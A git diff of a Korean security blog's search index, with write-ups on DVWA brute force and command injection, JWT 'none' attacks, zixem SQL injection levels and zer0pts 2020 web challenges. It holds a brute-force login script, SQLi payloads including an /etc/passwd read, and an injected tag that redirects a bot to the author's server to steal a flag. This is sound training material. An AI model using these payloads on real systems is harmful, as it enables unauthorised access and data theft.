@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>DVWA 웹 취약점 모의 훈련 도구 리뷰</title>
+      <link href="2021/01/19/dvwa-review-210119/"/>
+      <url>2021/01/19/dvwa-review-210119/</url>
+      
+        <content type="html"><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.</p><ul><li><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk</a></p></li><li><p>해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다.</p></li><li><p>기능 별 순차적으로 업데이트 할 예정입니다!</p></li></ul><h2 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다.</p><img src="/img/post/dvwa/bruteforce.png" class="lazyload" data-srcset="/img/post/dvwa/bruteforce.png" srcset="data:image/png;base64,666"><p>그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼)</p><p>사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다.</p><pre><code class="php">&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;     // Get username     $user = $_GET[ &#39;username&#39; ];     // Get password     $pass = $_GET[ &#39;password&#39; ];     $pass = md5( $pass );     // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;         // Get users details         $row    = mysqli_fetch_assoc( $result );         $avatar = $row[&quot;avatar&quot;];         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;     &#125;     else &#123;         // Login failed         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     &#125;     ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; </code></pre><p>로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다.</p><pre><code class="php">    // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );</code></pre><p>이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다.</p><p>일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다.</p><p>해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다.</p><pre><code class="py">#!/usr/bin/python3import requestsfrom time import sleepurl = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;with open(&#39;password.txt&#39;) as f:    while True:        line = f.readline().splitlines()        param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125;        r = requests.get(url, params=param, cookies=session)        sleep(1)        if(&quot;Welcome to the password protected area admin&quot; in r.text):            print(&quot;password matching!!&quot;,line)        else:            print(&quot;not match&quot;)        if not line:            break</code></pre><p>코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다.</p><p>이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서</p><p>문제를 풀어주면 된다.</p><hr><h3 id="Brute-Force-대응-방안"><a href="#Brute-Force-대응-방안" class="headerlink" title="Brute Force (대응 방안)"></a>Brute Force (대응 방안)</h3><p>무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만</p><p>자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다.</p><p>또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다.</p><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우</p><p>하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다.</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고,</p><p>하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다.</p><p>ex) shell_exec(ping 127.0.0.1)</p><p>ex) shell_exec(ping -c 4 127.0.0.1)</p><p>넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠.</p><p>다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다.</p><pre><code class="bash">ping -c 4 127.0.0.1 | pwd</code></pre><p>127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다.</p><p>즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠.</p><p>실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면</p><p>공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다.</p><h3 id="Command-Injection-대응-방안"><a href="#Command-Injection-대응-방안" class="headerlink" title="### Command Injection(대응 방안)"></a>### Command Injection(대응 방안)</h3><p>제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다.</p><p>그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다.</p><ol><li><p>특수문자 필터링</p></li><li><p>입력값 regex 정규식 표현 사용</p></li><li><p>화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한)</p></li></ol><p>뭐 이정도가 될 수 있겠네요 ㅎㅎ..</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> DVWA </tag>
+            
+            <tag> Pentesting </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Mac Big Sur 사용 후기 및 백업의 중요성..</title>
       <link href="2021/01/18/memo-210118/"/>
       <url>2021/01/18/memo-210118/</url>
@@ -168,6 +197,33 @@
     
     
     <entry>
+      <title>웹 해킹 기법 기초</title>
+      <link href="2021/01/01/webhacking-210101/"/>
+      <url>2021/01/01/webhacking-210101/</url>
+      
+        <content type="html"><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> Web Hacking </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>시스템 OS 개념 및 기초</title>
       <link href="2021/01/01/systemos-210101/"/>
       <url>2021/01/01/systemos-210101/</url>
@@ -197,33 +253,6 @@
     
     
     <entry>
-      <title>웹 해킹 기법 기초</title>
-      <link href="2021/01/01/webhacking-210101/"/>
-      <url>2021/01/01/webhacking-210101/</url>
-      
-        <content type="html"><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Docx </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Web </tag>
-            
-            <tag> Web Hacking </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>ChristmasCTF 2019 Write up</title>
       <link href="2020/12/26/christmasctf-201226/"/>
       <url>2020/12/26/christmasctf-201226/</url>
@@ -240,9 +269,9 @@
       
         <tags>
             
-            <tag> Web </tag>
-            
             <tag> Pwnable </tag>
+            
+            <tag> Web </tag>
             
             <tag> ChristmasCTF2019 </tag>
             
@@ -286,7 +315,7 @@
       <link href="2020/11/21/poxctf-201121/"/>
       <url>2020/11/21/poxctf-201121/</url>
       
-        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#x74;&#106;&#x68;&#x79;&#101;&#x6f;&#110;&#x40;&#107;&#97;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#109;">&#x73;&#x74;&#106;&#x68;&#x79;&#101;&#x6f;&#110;&#x40;&#107;&#97;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#109;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
+        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#116;&#x6a;&#104;&#121;&#x65;&#111;&#x6e;&#64;&#107;&#97;&#x6b;&#x61;&#111;&#46;&#x63;&#x6f;&#x6d;">&#x73;&#116;&#x6a;&#104;&#121;&#x65;&#111;&#x6e;&#64;&#107;&#97;&#x6b;&#x61;&#111;&#46;&#x63;&#x6f;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
       
       
       <categories>
@@ -435,9 +464,9 @@
       
         <tags>
             
-            <tag> Web </tag>
-            
             <tag> Pwnable </tag>
+            
+            <tag> Web </tag>
             
             <tag> PicoCTF2019 </tag>
             
@@ -880,31 +909,6 @@
     
     
     <entry>
-      <title>JWT None Type Injection</title>
-      <link href="2020/04/22/jwtinjection-200422/"/>
-      <url>2020/04/22/jwtinjection-200422/</url>
-      
-        <content type="html"><![CDATA[<h3 id="1-JWT-JSON-WEB-TOKEN"><a href="#1-JWT-JSON-WEB-TOKEN" class="headerlink" title="1. JWT(JSON WEB TOKEN)"></a>1. JWT(JSON WEB TOKEN)</h3><p>JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다.</p><p>JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다.</p><hr><h3 id="2-JWT-TOKEN"><a href="#2-JWT-TOKEN" class="headerlink" title="2. JWT TOKEN"></a>2. JWT TOKEN</h3><p>JWT는 아래와 같은 형태를 가지고 있고,</p><p>Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다.</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8</p><p>헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다.</p><pre><code>&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;</code></pre><p>두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다.</p><pre><code>&#123;   &quot;name&quot;: &quot;jhyeon&quot;&#125;</code></pre><p>세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데,</p><p>이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다.</p><pre><code>HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)</code></pre><p>위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다.</p><hr><h3 id="3-How-to-JWT-None-Type-Attack"><a href="#3-How-to-JWT-None-Type-Attack" class="headerlink" title="3. How to JWT None Type Attack?"></a>3. How to JWT None Type Attack?</h3><p>JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다.</p><pre><code>&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;</code></pre><p>일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데,</p><p>이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, 잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다.</p><p>따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다.</p><ul><li>참고 : <a href="https://jwt.io/">https://jwt.io</a></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> JWT </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>php wrapper</title>
       <link href="2020/04/22/phpwrapper-200422/"/>
       <url>2020/04/22/phpwrapper-200422/</url>
@@ -922,6 +926,31 @@
         <tags>
             
             <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JWT None Type Injection</title>
+      <link href="2020/04/22/jwtinjection-200422/"/>
+      <url>2020/04/22/jwtinjection-200422/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-JWT-JSON-WEB-TOKEN"><a href="#1-JWT-JSON-WEB-TOKEN" class="headerlink" title="1. JWT(JSON WEB TOKEN)"></a>1. JWT(JSON WEB TOKEN)</h3><p>JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다.</p><p>JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다.</p><hr><h3 id="2-JWT-TOKEN"><a href="#2-JWT-TOKEN" class="headerlink" title="2. JWT TOKEN"></a>2. JWT TOKEN</h3><p>JWT는 아래와 같은 형태를 가지고 있고,</p><p>Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다.</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8</p><p>헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다.</p><pre><code>&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;</code></pre><p>두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다.</p><pre><code>&#123;   &quot;name&quot;: &quot;jhyeon&quot;&#125;</code></pre><p>세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데,</p><p>이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다.</p><pre><code>HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  secret)</code></pre><p>위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다.</p><hr><h3 id="3-How-to-JWT-None-Type-Attack"><a href="#3-How-to-JWT-None-Type-Attack" class="headerlink" title="3. How to JWT None Type Attack?"></a>3. How to JWT None Type Attack?</h3><p>JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다.</p><pre><code>&#123;  &quot;alg&quot;: &quot;HS256&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;</code></pre><p>일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데,</p><p>이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, 잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다.</p><p>따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다.</p><ul><li>참고 : <a href="https://jwt.io/">https://jwt.io</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JWT </tag>
             
         </tags>
       
@@ -1013,16 +1042,16 @@
     
     
     <entry>
-      <title>zixem challenge Write up</title>
-      <link href="2020/04/10/zixemchall-200410/"/>
-      <url>2020/04/10/zixemchall-200410/</url>
+      <title>zer0pts 2020 Write up</title>
+      <link href="2020/04/10/zer0ptsctf-200410/"/>
+      <url>2020/04/10/zer0ptsctf-200410/</url>
       
-        <content type="html"><![CDATA[<p>Site : <a href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p><hr><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="sql">showprofile=0%27%20union%20select%201,2,version(),4;--%20-</code></pre><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="sql">item=0%27%20unionon%20select%201,2,version(),4;--%20-</code></pre><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="sql">ebookid=0%27%20union%20select%201,2,3,version(),5;--%20-</code></pre><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="py">#!/usr/bin/pythonimport requestsfor i in range(0,2000):param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)r = requests.get(param)print paramif &quot;Brute Force&quot; in r.text:    print &quot;found key: &quot; + str(i)    break</code></pre><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="sql">serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23</code></pre><hr><h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre><hr><h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><pre><code class="sql">id=0%09union%09seselectlect%091,version(),3;--%09-</code></pre><hr><h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><pre><code class="sql">0%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20-</code></pre><hr><h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul><li>php uuencode -&gt; base64 encode</li></ul><p>x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
+        <content type="html"><![CDATA[<h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;; // FLAG is defined in config.phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess = (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message = &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message = &#39;Wrong.&#39;;  &#125;&#125;?&gt;</code></pre><pre><code class="php">if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;</code></pre><p>해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다.</p><pre><code class="php">&lt;?phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;</code></pre><p>config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데,</p><p>정규식 표현으로 입력값 필터링을 하고 있다.</p><p>그런데 php 에서 basename 함수는 문자 \x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다.</p><p><code> index.php/config.php/%80?source </code></p><hr><h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><pre><code class="php">&lt;?php// (snipped)const flag = &#39;zer0pts&#123;&lt;censored&gt;&#125;&#39;;// (snipped)const crawl = async (url) =&gt; &#123;    console.log(`[+] Query! ($&#123;url&#125;)`);    const page = await browser.newPage();    try &#123;        await page.setUserAgent(flag);        await page.goto(url, &#123;            waitUntil: &#39;networkidle0&#39;,            timeout: 10 * 1000,        &#125;);        await page.click(&#39;#like&#39;);    &#125; catch (err)&#123;        console.log(err);    &#125;    await page.close();    console.log(`[+] Done! ($&#123;url&#125;)`)&#125;;</code></pre><p>문제에 보면 게시글을 올릴 수 있는 기능이 있다.</p><p>그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다.</p><p>그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다.</p><pre><code class="html">&lt;section&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;h1 class=&quot;mt-4&quot;&gt;      &lt;?php if ($post[&#39;published&#39;] === &#39;0&#39;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt;      &lt;?= $post[&#39;title&#39;] ?&gt;    &lt;/h1&gt;    &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#39;username&#39;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#39;likes&#39;] ?&gt;&lt;/span&gt;&lt;/span&gt;    &lt;div class=&quot;mt-3&quot;&gt;      &lt;?= render_tags($post[&#39;content&#39;]) ?&gt;    &lt;/div&gt;    &lt;div class=&quot;mt-3&quot;&gt;      &lt;a href=&quot;like.php?id=&lt;?= $post[&#39;id&#39;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;</code></pre><p>게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다.</p><p>로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때</p><p>리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다.</p><pre><code class="js">function render_tags($str) &#123;  $str = preg_replace(&#39;/\[\[(.+?)\]\]/&#39;, &#39;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#39;, $str);  $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;`  return $str;&#125;</code></pre><p>하지만 입력값 필터링이 걸려 있다.</p><p>그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면</p><p>audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다.</p><p>즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다.</p><pre><code class="html">&lt;a/udio href=&#39;myip.kr:12345&#39; id=&#39;like&#39;&gt;like</code></pre>]]></content>
       
       
       <categories>
           
-          <category> Wargame </category>
+          <category> CTF </category>
           
       </categories>
       
@@ -1038,16 +1067,16 @@
     
     
     <entry>
-      <title>zer0pts 2020 Write up</title>
-      <link href="2020/04/10/zer0ptsctf-200410/"/>
-      <url>2020/04/10/zer0ptsctf-200410/</url>
+      <title>zixem challenge Write up</title>
+      <link href="2020/04/10/zixemchall-200410/"/>
+      <url>2020/04/10/zixemchall-200410/</url>
       
-        <content type="html"><![CDATA[<h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><pre><code class="php">&lt;?phpinclude &#39;config.php&#39;; // FLAG is defined in config.phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123;  $guess = (string) $_POST[&#39;guess&#39;];  if (hash_equals($secret, $guess)) &#123;    $message = &#39;Congratulations! The flag is: &#39; . FLAG;  &#125; else &#123;    $message = &#39;Wrong.&#39;;  &#125;&#125;?&gt;</code></pre><pre><code class="php">if (isset($_GET[&#39;source&#39;])) &#123;  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));  exit();&#125;</code></pre><p>해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다.</p><pre><code class="php">&lt;?phpif (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;</code></pre><p>config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데,</p><p>정규식 표현으로 입력값 필터링을 하고 있다.</p><p>그런데 php 에서 basename 함수는 문자 \x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다.</p><p><code> index.php/config.php/%80?source </code></p><hr><h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><pre><code class="php">&lt;?php// (snipped)const flag = &#39;zer0pts&#123;&lt;censored&gt;&#125;&#39;;// (snipped)const crawl = async (url) =&gt; &#123;    console.log(`[+] Query! ($&#123;url&#125;)`);    const page = await browser.newPage();    try &#123;        await page.setUserAgent(flag);        await page.goto(url, &#123;            waitUntil: &#39;networkidle0&#39;,            timeout: 10 * 1000,        &#125;);        await page.click(&#39;#like&#39;);    &#125; catch (err)&#123;        console.log(err);    &#125;    await page.close();    console.log(`[+] Done! 